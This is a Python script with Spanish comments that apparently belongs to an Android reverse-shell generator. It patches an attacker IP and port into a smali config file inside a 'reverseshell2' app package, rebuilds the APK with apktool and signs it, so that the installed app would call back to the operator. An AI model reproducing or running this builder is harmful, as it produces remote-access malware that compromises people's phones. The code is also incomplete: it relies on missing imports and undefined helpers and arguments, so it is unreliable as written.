import sys
import threading
from colorama import Fore, Style,init

def animate(message):
    for c in itertools.cycle(['|', '/', '-', '\\']):
        if done:
            break
        print("\r"+Style.BRIGHT+Fore.GREEN+message+c+Fore.RESET, end="")
        time.sleep(0.1)

def build(direc, port, ip):
    #Preparamos la ruta
    editor = "Compiled_apk_files"+direc+"smali"+direc+"com"+direc+"example"+direc+"reverseshell2"+direc+"config.smali"
    
    port = str(port)
    try:
        #se pone en modo lecutra una linea en especifico
        file = open(editor,"r").readlines()
        file[16]=file[16][:21]+"\""+ip+"\""+"\n"
        file[21]=file[21][:21]+"\""+port+"\""+"\n"
        str_file="".join([str(elem) for elem in file])
        #se pone en modo escritura una linea en especifico
        open(editor,"w").write(str_file)
    except Exception as e:
        sys.exit()
    #se verifica que se tenga instalada java
    java_version = executeCMD("java -version")
    if java_version.stderr == "":
        print(Style.BRIGHT+Fore.RED+"\nJava Not Installed"+Fore.RESET)
    else:
        print(Style.BRIGHT+Fore.YELLOW+"\nGenerating apk file"+Fore.RESET)
        #iniciamos la generacion de la apk
        if args.output:
            #extraemos de los argumentos el nombre del output
            outFileName = args.output
        else:
            #le damos un nombre por default
            outFileName = "test.apk"
        done=False
        # Creamos un subproceso usando hilos
        t = threading.Thread(target=animate,args=("Building ",))
        #Se inicia los hilos
        t.start()
        #se ejecuta el comando para crear la apk
        resOut = executeCMD("java -jar Jar_Files/apktool.jar b Compiled_apk_files  -o "+outFileName)
        done = True
        t.join()
        if not resOut.returncode:
            print(Style.BRIGHT+Fore.GREEN+"\rSuccessfully apk built "+getpwd(outFileName)+"\n"+Fore.RESET,end="")
            print(Style.BRIGHT+Fore.YELLOW+"\nSigning the apk"+Fore.RESET)
            done=False
            #muestra animacion de carga mientras se ejecuta el hilo
            t = threading.Thread(target=animate,args=("Signing ",))
            t.start()
            #Ejecutamos el comando de registro de la apk previa
            resOut = executeCMD("java -jar Jar_Files/sign.jar "+outFileName+" --override")
            done = True
            t.join()
            #se espera un resultado del hilo
            if not resOut.returncode:
                print(Fore.GREEN+"\rSuccessfully signed the apk "+outFileName+Fore.RESET,end="")
                print(" ")
            else:
                print("\r"+resOut.stderr)
                print(Fore.RED+"Signing Failed"+Fore.RESET)    
        else:
            print("\r"+resOut.stderr)
            print(Fore.RED+"Building Failed"+Fore.RESET)